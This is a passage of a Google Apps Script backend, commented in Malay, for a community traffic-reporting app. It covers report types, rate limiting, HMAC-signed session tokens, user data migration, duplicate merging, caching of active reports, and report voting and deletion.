/**
 * Jalan Malaysia (dahulu JalanKita) — sistem navigasi & laporan trafik komuniti (ala Waze)
 * Dibina dengan Google Apps Script + Google Sheets + Leaflet/OpenStreetMap.
 *
 * Langkah pertama: jalankan fungsi setup() sekali dari editor Apps Script.
 */

// Versi aplikasi — SATU-SATUNYA tempat versi ditulis. Ia disuntik ke Index.html oleh doGet() (menu ☰ & skrin ralat).
// Naikkan setiap kali kod berubah supaya mudah semak telefon sudah guna kod terkini.
const APP_VERSION = '2026.11.05-k';

const CONFIG = {
  // ttlMin = berapa minit laporan kekal aktif sebelum luput
  REPORT_TYPES: {
    POLIS:       { label: 'Polis',        icon: '👮', ttlMin: 60 },
    KEMALANGAN:  { label: 'Kemalangan',   icon: '💥', ttlMin: 90 },
    SESAK:       { label: 'Kesesakan',    icon: '🚗', ttlMin: 45 },
    BAHAYA:      { label: 'Bahaya',       icon: '⚠️', ttlMin: 120 },
    BANJIR:      { label: 'Banjir',       icon: '🌊', ttlMin: 240 },
    LUBANG:      { label: 'Jalan Berlubang', icon: '🕳️', ttlMin: 1440 },
    KERJA_JALAN: { label: 'Kerja Jalan',  icon: '🚧', ttlMin: 4320 },
    KAMERA:      { label: 'Kamera AES',   icon: '📷', ttlMin: 43200 },
    KENDERAAN_ROSAK: { label: 'Kenderaan Rosak', icon: '🛻', ttlMin: 60 }
  },
  DOWNVOTE_LIMIT: 3,        // disembunyikan jika undi tidak >= nilai ini DAN melebihi undi ya
  MAX_VOTERS: 200,          // had senarai pengundi bagi satu laporan
  USER_ACTIVE_SEC: 180,     // pengguna dianggap aktif jika kemas kini dalam tempoh ini; lokasi dalam cache luput selepas ini
  USER_RETAIN_SEC: 3600,    // hanya untuk membersihkan sheet Pengguna lama (lokasi kini dalam cache, bukan Sheet)
  NEARBY_USERS_KM: 15,      // hanya tunjuk pengguna lain dalam radius ini
  REPORTS_RADIUS_KM: 60,    // hanya hantar laporan dalam radius ini kepada klien
  MAX_REPORTS_SENT: 300,    // had laporan setiap respons (terdekat dahulu)
  MAX_ACTIVE_REPORTS: 3000, // had laporan aktif keseluruhan — halang Sheet & respons membengkak
  MAX_USERS: 2000,          // had indeks "pengguna sejam" untuk panel pentadbir (saiz nilai cache)
  MAX_STATS_ROWS: 10000,    // had baris statistik profil
  MAX_PREFS_ROWS: 10000,    // had baris data pengguna (tetapan disegerak)
  MAX_PREFS_CHARS: 12000,   // had saiz data seorang pengguna
  PREFS_RETAIN_DAYS: 180,   // data pengguna yang tidak aktif dipadam selepas tempoh ini
  STATS_RETAIN_DAYS: 365,   // statistik (mata) pengguna yang tidak aktif setahun dipadam — beri ruang kepada pengguna baharu
  REPORT_COOLDOWN_SEC: 30,  // had kekerapan laporan seorang pengguna
  MAX_REPORT_ITEMS: 5,      // maks jenis dalam satu laporan berbilang
  MAX_SHARES: 500,          // had baris perkongsian perjalanan
  SHARE_MAX_MIN: 360,       // perkongsian paling lama 6 jam (termasuk "sampai destinasi")
  MAX_BANNED: 500,          // had senarai pengguna disekat
  REGION: 'my',
  // Had kadar: [bilangan maksimum, tetingkap saat]. Kunci "G_" = global (semua pengguna).
  LIMITS: {
    report:    [10, 3600],   G_report: [300, 3600],
    vote:      [40, 3600],   G_vote:   [1000, 3600],
    route:     [30, 3600],   geocode:  [60, 3600],
    G_maps:    [220, 21600], // kuota Maps ~1000/hari untuk Gmail; ~880/hari di sini
    G_recheck: [80, 21600],  // semakan "laluan lebih pantas" — maks ~1/3 kuota Maps, baki untuk carian & navigasi
    share:     [10, 3600],   shareUpd: [720, 3600],   shareView: [1500, 3600],
    along:     [60, 3600],   G_overpass: [300, 3600], // OpenStreetMap Overpass — perkhidmatan percuma, guna berhemah
    G_photonAlong: [900, 3600], // Photon untuk "Cari di sepanjang laluan" (berasingan daripada carian tempat; hasil disimpan 1 jam)
    admin:     [600, 3600],
    location:  [400, 3600],  live: [720, 3600],   // aplikasi menyegar setiap 15 s ≈ 240 sejam
    profile:   [120, 3600],
    prefsLoad: [120, 3600],   prefsSave: [240, 3600],
    migrate:   [5, 3600],     // pindah data dari ID lama (lihat migrateData)
    resolve:   [30, 3600],   G_resolve: [400, 3600],  // kuota UrlFetch ~20,000/hari
    G_photon:  [500, 3600],  // OpenStreetMap Photon — guna secara berhemah (perkhidmatan percuma)
    G_places:  [60, 21600]   // Google Places (berbayar selepas kuota percuma) — maks ~240 sehari
  }
};

const SHEET_REPORTS = 'Laporan';
const SHEET_USERS = 'Pengguna';
const REPORT_HEADERS = ['ID', 'Jenis', 'Lat', 'Lng', 'Keterangan', 'PenggunaID', 'Nama',
  'Masa', 'TamatTempoh', 'UndiYa', 'UndiTidak', 'Pengundi', 'Arah'];
const USER_HEADERS = ['PenggunaID', 'Nama', 'Lat', 'Lng', 'Kelajuan', 'Arah', 'KemaskiniTerakhir', 'Mood'];
const SHEET_STATS = 'Statistik';
const SHEET_PREFS = 'DataPengguna';
const PREFS_HEADERS = ['PenggunaID', 'Data', 'Kemaskini'];
const STATS_HEADERS = ['PenggunaID', 'Nama', 'Laporan', 'UndiDiterima', 'UndiDiberi', 'Sertai', 'Aktif'];
// Emoji "mood" yang dibenarkan (dipaparkan kepada pengguna lain di peta) — senarai tetap, bukan teks bebas
const MOODS = ['🙂', '😎', '🤠', '😇', '🥳', '😴', '🤓', '😤', '🥶',
  '🤩', '👻', '🐱', '🦁', '🐼', '🚗', '🏍️', '🚕', '🚚'];

// ---------------------------------------------------------------- Web app

// Ikon aplikasi (tab pelayar & "Tambah ke Skrin Utama"). Fail dalam repo (assets/), dihidang terus oleh GitHub — URL TETAP.
const ICON_URL_ = 'https://raw.githubusercontent.com/S-K84/MY-PROJECT/main/assets/icon-180.png';

function doGet(e) {
  // Saluran uji: PEMILIK boleh buka .../exec?uji=1 untuk mencuba IndexUji.html di telefon sebelum perubahan berisiko
  // dihantar kepada semua pengguna (Index.html). Pengguna lain sentiasa mendapat Index.html.
  const uji = !!(e && e.parameter && e.parameter.uji === '1') && isOwner_();
  const t = HtmlService.createTemplateFromFile(uji ? 'IndexUji' : 'Index');
  t.typesJson = jsonForScript_(CONFIG.REPORT_TYPES);
  // Pautan kongsi: .../exec?to=3.1390,101.6869&name=KLCC → terus kira laluan
  t.initialJson = jsonForScript_(startParam_(e && e.parameter));
  // Pautan jejak perjalanan: .../exec?track=<32 hex> (disemak; nilai lain diabaikan)
  const tr = String((e && e.parameter && e.parameter.track) || '');
  t.trackJson = jsonForScript_(SHARE_ID_RE_.test(tr) ? tr : null);
  t.appUrlJson = jsonForScript_(ScriptApp.getService().getUrl() || '');
  t.versionJson = jsonForScript_(APP_VERSION + (uji ? ' (uji)' : ''));
  // Tiada setXFrameOptionsMode(ALLOWALL): halaman tidak boleh dibenam oleh laman lain (clickjacking).
  return t.evaluate()
    .setTitle('Jalan Malaysia')
    .setFaviconUrl(ICON_URL_)
    .addMetaTag('viewport', 'width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no');
}

/** JSON selamat untuk diletak dalam <script> (halang "</script>" dalam data). */
function jsonForScript_(v) {
  return JSON.stringify(v).replace(/</g, '\\u003c').replace(/>/g, '\\u003e')
    .replace(/\u2028/g, '\\u2028').replace(/\u2029/g, '\\u2029');
}

function startParam_(p) {
  if (!p || !p.to) return null;
  const m = String(p.to).trim().match(/^(-?\d{1,2}(?:\.\d+)?)\s*,\s*(-?\d{1,3}(?:\.\d+)?)$/);
  const c = m && isValidCoord_(Number(m[1]), Number(m[2])) ? { lat: Number(m[1]), lng: Number(m[2]) } : null;
  if (!c) return null;
  // sub = koordinat: nama datang daripada pengirim pautan, jadi tunjuk juga titik sebenar
  return { lat: c.lat, lng: c.lng, title: String(p.name || '').replace(/[\u0000-\u001f<>]/g, '').trim().slice(0, 80) || 'Lokasi dikongsi',
    sub: 'Dikongsi · ' + c.lat.toFixed(5) + ', ' + c.lng.toFixed(5) };
}

// ---------------------------------------------------------------- Setup

// ---------------------------------------------------------------- Kawalan pentadbir
// Fungsi tanpa "_" di hujung boleh dipanggil oleh SESIAPA melalui google.script.run.
// setup() & cleanup() mesti disekat supaya hanya pemilik (editor) atau pencetus sebenar boleh menjalankannya.

function isOwner_() {
  const owner = Session.getEffectiveUser().getEmail();
  return !!owner && Session.getActiveUser().getEmail() === owner;
}

function isRealTrigger_(e) {
  if (!e || !e.triggerUid) return false;
  const uid = String(e.triggerUid);
  return ScriptApp.getProjectTriggers().some(t => t.getUniqueId() === uid);
}

function setup() {
  if (!isOwner_()) throw new Error('Hanya pemilik skrip boleh menjalankan setup().');
  const props = PropertiesService.getScriptProperties();
  let ss;
  const id = props.getProperty('SHEET_ID');
  if (id) {
    ss = SpreadsheetApp.openById(id);
  } else {
    ss = SpreadsheetApp.getActiveSpreadsheet() || SpreadsheetApp.create('JalanKita - Pangkalan Data');
    props.setProperty('SHEET_ID', ss.getId());
  }
  if (!props.getProperty('TOKEN_SECRET')) {
    props.setProperty('TOKEN_SECRET', Utilities.getUuid() + Utilities.getUuid());
  }
  ensureSheet_(ss, SHEET_REPORTS, REPORT_HEADERS);
  ensureSheet_(ss, SHEET_USERS, USER_HEADERS);
  ensureSheet_(ss, SHEET_STATS, STATS_HEADERS);
  ensureSheet_(ss, SHEET_PREFS, PREFS_HEADERS);

  // Pencetus pembersihan setiap jam
  ScriptApp.getProjectTriggers()
    .filter(tr => tr.getHandlerFunction() === 'cleanup')
    .forEach(tr => ScriptApp.deleteTrigger(tr));
  ScriptApp.newTrigger('cleanup').timeBased().everyHours(1).create();

  Logger.log('Siap. Spreadsheet: ' + ss.getUrl());
}

function ensureSheet_(ss, name, headers) {
  let sh = ss.getSheetByName(name);
  if (!sh) sh = ss.insertSheet(name);
  sh.getRange(1, 1, 1, headers.length).setValues([headers]).setFontWeight('bold');
  sh.setFrozenRows(1);
  return sh;
}

function getSheet_(name) {
  const id = PropertiesService.getScriptProperties().getProperty('SHEET_ID');
  if (!id) throw new Error('Sistem belum disediakan.');
  return SpreadsheetApp.openById(id).getSheetByName(name);
}

// ---------------------------------------------------------------- Identiti (token bertandatangan)
//
// ID pengguna dikeluarkan oleh server dan ditandatangani HMAC, jadi klien tidak boleh
// menyamar sebagai pengguna lain atau mereka ID sendiri. Jika web app ditetapkan kepada
// "Anyone with Google account", ID diterbitkan daripada Session.getTemporaryActiveUserKey()
// supaya seorang pengguna = satu identiti (lebih sukar untuk spam / undi palsu).

/** oldToken (pilihan): token lama yang masih menunggu keputusan "Pulihkan data?" di pelayar ini. */
function getSession(storedToken, oldToken) {
  const gKey = Session.getTemporaryActiveUserKey();
  if (gKey) {
    const uid = 'g_' + hash_(gKey).slice(0, 20);
    // owner hanya untuk paparan menu; setiap fungsi pentadbir menyemak isOwner_() sekali lagi di server
    const out = { token: uid + '.' + sign_(uid), owner: isOwner_() };
    const oldId = tokenId_(oldToken || storedToken);
    if (oldId && oldId !== uid) {
      carryBan_(oldId, uid);
      try { const offer = migrationOffer_(oldId, uid); if (offer) out.migrate = offer; } catch (e) { /* tawaran tidak kritikal */ }
    }
    return out;
  }
  if (storedToken) {
    try { verify_(storedToken); return { token: String(storedToken) }; } catch (e) { /* keluarkan baharu */ }
  }
  const uid = 'a_' + Utilities.getUuid().replace(/-/g, '').slice(0, 20);
  return { token: uid + '.' + sign_(uid) };
}

/** Pulangkan userId jika token sah; jika tidak, campak ralat. */
function verify_(token) {
  const parts = String(token || '').split('.');
  if (parts.length !== 2 || !/^[ag]_[A-Za-z0-9_-]{8,40}$/.test(parts[0])) throw new Error('Sesi tidak sah. Muat semula halaman.');
  if (!safeEqual_(sign_(parts[0]), parts[1])) throw new Error('Sesi tidak sah. Muat semula halaman.');
  const gKey = Session.getTemporaryActiveUserKey();
  if (gKey && parts[0] !== 'g_' + hash_(gKey).slice(0, 20)) throw new Error('Sesi tidak sah. Muat semula halaman.');
  if (bannedList_().indexOf(parts[0]) >= 0) throw new Error('Akaun ini telah disekat oleh pentadbir.');
  return parts[0];
}

// ---------------------------------------------------------------- Pindah data bila ID bertukar
// Session.getTemporaryActiveUserKey() dirotasi oleh Google setiap 30 hari, jadi ID "g_…" pengguna bertukar dan
// mata, tetapan & sekatannya kelihatan hilang. Pelayar masih menyimpan token lama (ditandatangani HMAC oleh server),
// jadi data boleh dipindah ke ID baharu:
//  - Sekatan dipindah SERTA-MERTA tanpa bertanya (supaya pengguna disekat tidak "bebas" setiap 30 hari).
//  - Data lain dipindah hanya selepas pengguna mengesahkan (migrateData). Pelayar yang sama boleh dikongsi oleh dua
//    akaun Google; tanpa pengesahan, orang kedua akan "mewarisi" data orang pertama. Kad pengesahan hanya memaparkan
//    nama samaran & mata (bukan Rumah/Kerja).
//  - Data DIPINDAH (bukan disalin): ID lama tidak lagi mempunyai data, jadi token lama yang dicuri tidak berguna selepas itu.

/** ID dalam token jika tandatangannya sah (tanpa semakan akaun Google semasa), jika tidak null. */
function tokenId_(token) {
  const parts = String(token || '').split('.');
  if (parts.length !== 2 || !/^[ag]_[A-Za-z0-9_-]{8,40}$/.test(parts[0])) return null;
  try { return safeEqual_(sign_(parts[0]), parts[1]) ? parts[0] : null; } catch (e) { return null; }
}

/** Sekatan ID lama → ID baharu. */
function carryBan_(oldId, newId) {
  const list = bannedList_();
  if (list.indexOf(oldId) < 0 || list.indexOf(newId) >= 0) return;
  const lock = lock_();
  try {
    const fresh = bannedList_().filter(x => x !== newId);
    if (fresh.length >= CONFIG.MAX_BANNED) return;
    fresh.push(newId);
    PropertiesService.getScriptProperties().setProperty('BANNED', JSON.stringify(fresh));
    CacheService.getScriptCache().put('banned', JSON.stringify(fresh), 600);
  } finally {
    lock.releaseLock();
  }
}

function findRow_(sh, id) {
  const last = sh.getLastRow();
  if (last < 2) return -1;
  const i = sh.getRange(2, 1, last - 1, 1).getValues().findIndex(v => String(v[0]) === id);
  return i < 0 ? -1 : i + 2;
}
const statsPoints_ = r => (Number(r[2]) || 0) * 10 + (Number(r[3]) || 0) * 5 + (Number(r[4]) || 0);

/**
 * Tawaran pindah: { name, points } jika ID lama ada data DAN ID baharu belum ada mata.
 * (ID baharu yang sudah ada mata = akaun lain yang aktif di pelayar yang sama → jangan ganggu.)
 */
function migrationOffer_(oldId, newId) {
  const st = statsSheet_(), oldRow = findRow_(st, oldId), newRow = findRow_(st, newId);
  const oldStats = oldRow > 0 ? st.getRange(oldRow, 1, 1, STATS_HEADERS.length).getValues()[0] : null;
  if (newRow > 0 && statsPoints_(st.getRange(newRow, 1, 1, STATS_HEADERS.length).getValues()[0]) > 0) return null;
  const hasPrefs = findRow_(prefsSheet_(), oldId) > 0;
  if (!hasPrefs && !(oldStats && statsPoints_(oldStats) > 0)) return null;
  return { name: oldStats ? String(oldStats[1] || '') : '', points: oldStats ? statsPoints_(oldStats) : 0 };
}

/** Pindah mata & data pengguna dari ID dalam oldToken ke pengguna semasa (selepas pengguna mengesahkan). */
function migrateData(token, oldToken) {
  const newId = verify_(token);
  const oldId = tokenId_(oldToken);
  if (!oldId || oldId === newId) throw new Error('Token lama tidak sah.');
  rateLimit_('migrate', newId);
  const lock = lock_();
  try {
    if (!migrationOffer_(oldId, newId)) throw new Error('Tiada data untuk dipulihkan.');
    // Statistik: gabung kiraan ke ID baharu (baris ID baharu, jika ada, belum ada mata), tarikh Sertai paling awal
    const st = statsSheet_(), oldRow = findRow_(st, oldId);
    let points = 0;
    if (oldRow > 0) {
      const o = st.getRange(oldRow, 1, 1, STATS_HEADERS.length).getValues()[0];
      points = statsPoints_(o);
      const newRow = findRow_(st, newId);
      if (newRow > 0) {
        const n = st.getRange(newRow, 1, 1, STATS_HEADERS.length).getValues()[0];
        const joined = Math.min(new Date(o[5]).getTime() || Infinity, new Date(n[5]).getTime() || Infinity);
        st.getRange(newRow, 2, 1, 6).setValues([[protectCell_(String(n[1] || o[1] || '')), Number(n[2]) + Number(o[2]),
          Number(n[3]) + Number(o[3]), Number(n[4]) + Number(o[4]), isFinite(joined) ? new Date(joined) : new Date(), new Date()]]);
        st.deleteRow(oldRow);
      } else {
        st.getRange(oldRow, 1).setValue(newId);
        st.getRange(oldRow, 7).setValue(new Date());
      }
    }
    // Data pengguna: ID baharu mungkin sudah menyimpan salinan dari pelayar ini — kekalkan yang paling baharu
    const pf = prefsSheet_(), pOld = findRow_(pf, oldId);
    if (pOld > 0) {
      const pNew = findRow_(pf, newId);
      if (pNew < 0) pf.getRange(pOld, 1).setValue(newId);
      else {
        const tOld = new Date(pf.getRange(pOld, 3).getValue()).getTime() || 0;
        const tNew = new Date(pf.getRange(pNew, 3).getValue()).getTime() || 0;
        if (tOld > tNew) pf.getRange(pNew, 2, 1, 2).setValues([[protectCell_(String(pf.getRange(pOld, 2).getValue())), new Date()]]);
        pf.deleteRow(pOld);
      }
    }
    return { ok: true, points: points };
  } finally {
    lock.releaseLock();
  }
}

function sign_(uid) {
  const secret = PropertiesService.getScriptProperties().getProperty('TOKEN_SECRET');
  if (!secret) throw new Error('Sistem belum disediakan.');
  return Utilities.base64EncodeWebSafe(Utilities.computeHmacSha256Signature(uid, secret)).replace(/=+$/, '');
}

function hash_(s) {
  return Utilities.base64EncodeWebSafe(
    Utilities.computeDigest(Utilities.DigestAlgorithm.SHA_256, s)).replace(/=+$/, '');
}

function safeEqual_(a, b) {
  if (a.length !== b.length) return false;
  let r = 0;
  for (let i = 0; i < a.length; i++) r |= a.charCodeAt(i) ^ b.charCodeAt(i);
  return r === 0;
}

// ---------------------------------------------------------------- Had kadar

function rateLimit_(name, who, count) {
  rateLimitAll_([[name, who]], count);
}

/**
 * Kunci kiraan bagi tetingkap masa SEMASA. Nombor tetingkap ada dalam kunci, jadi setiap tetingkap bermula dari 0.
 * (Dahulu kunci yang sama ditulis semula dengan cache.put, yang menetapkan semula tempoh luput setiap kali —
 * kiraan tidak pernah kosong selagi ada permintaan, lalu pengguna aktif akhirnya disekat terus.)
 */
function rlKey_(name, who) {
  const win = CONFIG.LIMITS[name][1];
  return 'rl_' + name + '_' + (who || 'all') + '_' + Math.floor(Date.now() / 1000 / win);
}

// Semak SEMUA had dahulu, baru tolak baki. Permintaan yang ditolak tidak menghabiskan kuota.
// Tiada kunci (lock): permintaan serentak boleh melebihi had sedikit — boleh diterima untuk had lembut.
function rateLimitAll_(pairs, count) {
  count = Math.max(1, Math.floor(Number(count) || 1));
  const cache = CacheService.getScriptCache();
  const rows = pairs.map(p => ({ lim: CONFIG.LIMITS[p[0]], key: rlKey_(p[0], p[1]) }));
  const got = cache.getAll(rows.map(x => x.key));
  rows.forEach(x => { x.n = Number(got[x.key] || 0); });
  if (rows.some(x => x.n + count > x.lim[0])) throw new Error('Terlalu banyak permintaan. Cuba lagi nanti.');
  rows.forEach(x => cache.put(x.key, String(x.n + count), x.lim[1]));
}

/** Kunci skrip dengan mesej mesra. waitLock() melontar "Lock timeout…" yang disangka klien sebagai tiada liputan. */
function lock_(ms) {
  const lock = LockService.getScriptLock();
  if (!lock.tryLock(ms || 10000)) { bumpDaily_('b'); throw new Error('Sistem sibuk. Cuba lagi sebentar.'); }
  return lock;
}

// ---------------------------------------------------------------- Laporan

function submitReport(token, r) {
  r = r || {};
  return submitReports(token, { lat: r.lat, lng: r.lng, name: r.name,
    items: [{ type: r.type, desc: r.desc, heading: r.heading }] });
}

/**
 * Satu laporan untuk beberapa perkara di tempat yang sama (cth. polis + kemalangan + kerja jalan).
 * r = { lat, lng, name, items: [{ type, desc, heading }] } — maks 5 jenis berbeza.
 * Setiap jenis dikira dalam had kadar seperti laporan biasa (tidak boleh dijadikan jalan pintas untuk spam).
 */
function submitReports(token, r) {
  const userId = verify_(token);
  r = r || {};
  const lat = Number(r.lat), lng = Number(r.lng);
  if (!isValidCoord_(lat, lng)) throw new Error('Lokasi tidak sah.');
  const raw = Array.isArray(r.items) ? r.items : [];
  if (!raw.length || raw.length > CONFIG.MAX_REPORT_ITEMS) throw new Error('Pilih 1 hingga ' + CONFIG.MAX_REPORT_ITEMS + ' jenis laporan.');
  const seen = {};
  const items = raw.map(it => {
    it = it || {};
    const type = String(it.type || '');
    if (!Object.prototype.hasOwnProperty.call(CONFIG.REPORT_TYPES, type)) throw new Error('Jenis laporan tidak sah.');
    if (seen[type]) throw new Error('Jenis laporan berulang.');
    seen[type] = true;
    // Arah laporan (0–359°, arah perjalanan yang terjejas). Kosong = semua arah (cth. pelapor tidak bergerak).
    const hd = Number(it.heading);
    const heading = it.heading !== null && it.heading !== '' && isFinite(hd) && hd >= 0 && hd < 360 ? Math.round(hd) : '';
    return { type: type, desc: cell_(it.desc, 140), heading: heading };
  });

  const cache = CacheService.getScriptCache();
  const cdKey = 'cd_' + userId;
  if (cache.get(cdKey)) throw new Error('Tunggu sebentar sebelum membuat laporan lain.');
  rateLimitAll_([['report', userId], ['G_report']], items.length);
  if (getReports_().length + items.length > CONFIG.MAX_ACTIVE_REPORTS) throw new Error('Sistem penuh buat sementara. Cuba lagi nanti.');

  const lock = lock_();
  try {
    const sh = getSheet_(SHEET_REPORTS);
    const now = new Date(), nowMs = now.getTime(), name = cell_(r.name, 30) || 'Tanpa Nama';
    const last = sh.getLastRow();
    const rows = last >= 2 ? sh.getRange(2, 1, last - 1, REPORT_HEADERS.length).getValues() : [];
    let merged = 0;
    const ids = items.map(it => {
      // Laporan sama (jenis, ≤200 m, arah serasi) sudah aktif → gabung sebagai 👍, bukan pin baharu (seperti Waze)
      const dup = findDuplicate_(rows, it.type, lat, lng, it.heading, nowMs);
      if (dup >= 0) {
        merged++;
        const row = rows[dup], rowNum = dup + 2;
        const voters = String(row[11] || '').split(',').filter(String);
        if (voters.indexOf(userId) < 0 && voters.length < CONFIG.MAX_VOTERS) {
          voters.push(userId);
          row[8] = new Date(extendExpiry_(row[8], CONFIG.REPORT_TYPES[it.type].ttlMin, nowMs));
          row[9] = Number(row[9]) + 1;
          row[11] = voters.join(',');
          sh.getRange(rowNum, 9, 1, 2).setValues([[row[8], row[9]]]);
          sh.getRange(rowNum, 12).setValue(row[11]);
          bumpStats_(userId, '', 0, 0, 1);                                               // dikira sebagai undi
          if (row[5] && String(row[5]) !== userId) bumpStats_(String(row[5]), '', 0, 1, 0); // pelapor asal dapat 👍
        }
        return String(row[0]);
      }
      const id = Utilities.getUuid();
      const expires = new Date(nowMs + CONFIG.REPORT_TYPES[it.type].ttlMin * 60000);
      const newRow = [id, it.type, lat, lng, it.desc, userId, name, now, expires, 1, 0, userId, it.heading];
      sh.appendRow(newRow);
      rows.push(newRow);
      return id;
    });
    bumpStats_(userId, cell_(r.name, 30), items.length - merged, 0, 0);
    if (items.length - merged > 0) bumpDaily_('r', items.length - merged);
    cache.put(cdKey, '1', CONFIG.REPORT_COOLDOWN_SEC);
    rebuildReports_();
    return { ok: true, ids: ids, id: ids[0], merged: merged };
  } finally {
    lock.releaseLock();
  }
}

function isHidden_(up, down) {
  return down >= CONFIG.DOWNVOTE_LIMIT && down > up;
}

const DUP_RADIUS_KM_ = 0.2;     // laporan jenis sama dalam radius ini dianggap laporan yang sama
const DUP_HEADING_TOL_ = 60;    // dan arahnya berbeza tidak lebih daripada ini (laporan tanpa arah = semua arah)

/** Indeks baris laporan aktif yang sama (jenis, terdekat ≤200 m, arah serasi), atau -1. */
function findDuplicate_(rows, type, lat, lng, heading, nowMs) {
  let best = -1, bestD = Infinity;
  rows.forEach((x, i) => {
    if (!x[0] || String(x[1]) !== type || new Date(x[8]).getTime() <= nowMs || isHidden_(Number(x[9]), Number(x[10]))) return;
    if (!headingsMatch_(x[12], heading)) return;
    const d = distKm_(lat, lng, Number(x[2]), Number(x[3]));
    if (d <= DUP_RADIUS_KM_ && d < bestD) { best = i; bestD = d; }
  });
  return best;
}

function headingsMatch_(a, b) {
  if (a === '' || a == null || b === '' || b == null || !isFinite(Number(a)) || !isFinite(Number(b))) return true;
  return Math.abs(((Number(b) - Number(a)) % 360 + 540) % 360 - 180) <= DUP_HEADING_TOL_;
}

/** "Masih ada" memanjangkan separuh TTL, tetapi tidak lebih 2×TTL dari sekarang. */
function extendExpiry_(exp, ttlMin, nowMs) {
  return Math.min(Math.max(new Date(exp).getTime(), nowMs) + ttlMin * 30000, nowMs + ttlMin * 120000);
}

// ---- Cache laporan aktif
// Laporan dibaca dari cache (bukan Sheet) oleh getLiveData setiap 15 s bagi setiap pengguna. Setiap penulisan
// (lapor, undi, padam, sekat, cleanup) membina semula cache di bawah kunci skrip, jadi cache boleh disimpan lama
// (6 jam) — yang luput ditapis semasa membaca. Senarai besar dipecah kepada beberapa nilai (had cache 100 KB setiap satu).
const REPORTS_CHUNK_ = 30000;   // aksara setiap bahagian (≤ ~90 KB walaupun semua aksara 3 bait UTF-8)
const REPORTS_TTL_ = 21600;

function getReports_() {
  const cache = CacheService.getScriptCache();
  const meta = parseJson_(cache.get('rep_meta'));
  if (meta && meta.v && meta.n >= 0) {
    const keys = [];
    for (let i = 0; i < meta.n; i++) keys.push('rep_' + meta.v + '_' + i);
    const got = keys.length ? cache.getAll(keys) : {};
    if (keys.every(k => got[k] != null)) {
      const list = keys.length ? parseJson_(keys.map(k => got[k]).join('')) : [];
      if (Array.isArray(list)) {
        const now = Date.now();
        return list.filter(r => r.expires > now);
      }
    }
  }
  return rebuildReports_();   // cache tiada / sebahagiannya telah dibuang oleh Google
}

/** Baca laporan aktif dari Sheet dan simpan dalam cache. Panggil selepas setiap perubahan pada sheet Laporan. */
function rebuildReports_() {
  const sh = getSheet_(SHEET_REPORTS);
  const last = sh.getLastRow();
  const now = Date.now();
  const rows = last >= 2 ? sh.getRange(2, 1, last - 1, REPORT_HEADERS.length).getValues() : [];
  // Hanya medan awam dipulangkan — PenggunaID & senarai pengundi kekal di server.
  const out = rows
    .filter(x => x[0] && new Date(x[8]).getTime() > now && !isHidden_(Number(x[9]), Number(x[10])))
    .map(x => ({
      id: String(x[0]), type: String(x[1]), lat: Number(x[2]), lng: Number(x[3]),
      desc: String(x[4]), name: String(x[6]), time: new Date(x[7]).getTime(),
      expires: new Date(x[8]).getTime(), up: Number(x[9]), down: Number(x[10]),
      heading: x[12] === '' || x[12] == null || !isFinite(Number(x[12])) ? null : Number(x[12])
    }));
  const json = JSON.stringify(out), v = Utilities.getUuid().replace(/-/g, '').slice(0, 10), parts = {};
  let n = 0;
  for (let i = 0; i < json.length;) {
    let end = Math.min(json.length, i + REPORTS_CHUNK_);
    const c = json.charCodeAt(end - 1);
    if (end < json.length && c >= 0xD800 && c <= 0xDBFF) end--;   // jangan pecahkan pasangan surrogate (emoji)
    parts['rep_' + v + '_' + (n++)] = json.slice(i, end);
    i = end;
  }
  const cache = CacheService.getScriptCache();
  try {
    if (n) cache.putAll(parts, REPORTS_TTL_);
    cache.put('rep_meta', JSON.stringify({ v: v, n: n }), REPORTS_TTL_);   // meta terakhir: bahagian sudah sedia
  } catch (e) {
    cache.remove('rep_meta');   // gagal simpan — pembaca seterusnya akan membaca Sheet
  }
  return out;
}

/** up = true ("masih ada") memanjangkan tempoh; false ("tiada lagi") menambah undi tidak. */
/**
 * Pelapor memadam laporannya sendiri (cth. tersalah tekan lapor pantas, atau polis sudah tiada).
 * Hanya pengguna yang membuat laporan (lajur PenggunaID) dibenarkan — semakan di server, bukan di klien.
 */
function deleteMyReport(token, id) {
  const userId = verify_(token);
  id = String(id || '');
  if (!/^[0-9a-f-]{8,36}$/i.test(id)) throw new Error('Laporan tidak dijumpai.');
  rateLimitAll_([['vote', userId], ['G_vote']]);
  const lock = lock_();
  try {
    const sh = getSheet_(SHEET_REPORTS), last = sh.getLastRow();
    const rows = last < 2 ? [] : sh.getRange(2, 1, last - 1, 6).getValues();
    const i = rows.findIndex(v => String(v[0]) === id);
    if (i < 0) throw new Error('Laporan tidak dijumpai.');
    if (String(rows[i][5]) !== userId) throw new Error('Hanya pelapor boleh memadam laporan ini.');
    sh.deleteRow(i + 2);
    rebuildReports_();
    return { ok: true };
  } finally {
    lock.releaseLock();
  }
}

function voteReport(token, id, up) {
  const userId = verify_(token);
  id = String(id || '');
  if (!/^[0-9a-f-]{8,36}$/i.test(id)) throw new Error('Laporan tidak dijumpai.');
  up = up === true;
  rateLimitAll_([['vote', userId], ['G_vote']]);

  const lock = lock_();
  try {
    const sh = getSheet_(SHEET_REPORTS);
    const last = sh.getLastRow();
    if (last < 2) throw new Error('Laporan tidak dijumpai.');
    const ids = sh.getRange(2, 1, last - 1, 1).getValues();
    const idx = ids.findIndex(v => String(v[0]) === id);
    if (idx < 0) throw new Error('Laporan tidak dijumpai.');
    const rowNum = idx + 2;
    const row = sh.getRange(rowNum, 1, 1, REPORT_HEADERS.length).getValues()[0];
    if (new Date(row[8]).getTime() <= Date.now()) throw new Error('Laporan sudah luput.');
    const voters = String(row[11] || '').split(',').filter(String);
    if (voters.indexOf(userId) >= 0) throw new Error('Anda sudah mengundi laporan ini.');
    if (voters.length >= CONFIG.MAX_VOTERS) throw new Error('Undian ditutup untuk laporan ini.');
    voters.push(userId);

    if (up) {
      const ttl = CONFIG.REPORT_TYPES[row[1]] ? CONFIG.REPORT_TYPES[row[1]].ttlMin : 60;
      const newExp = extendExpiry_(row[8], ttl, Date.now());
      sh.getRange(rowNum, 9, 1, 2).setValues([[new Date(newExp), Number(row[9]) + 1]]);
    } else {
      sh.getRange(rowNum, 11).setValue(Number(row[10]) + 1);
    }
    sh.getRange(rowNum, 12).setValue(voters.join(','));
    bumpStats_(userId, '', 0, 0, 1);                                     // pengundi
    if (up && row[5] && String(row[5]) !== userId) bumpStats_(String(row[5]), '', 0, 1, 0); // pelapor dapat 👍
    rebuildReports_();
    return { ok: true };
  } finally {
    lock.releaseLock();
  }
}

// ---------------------------------------------------------------- Pengguna (Wazer berdekatan)
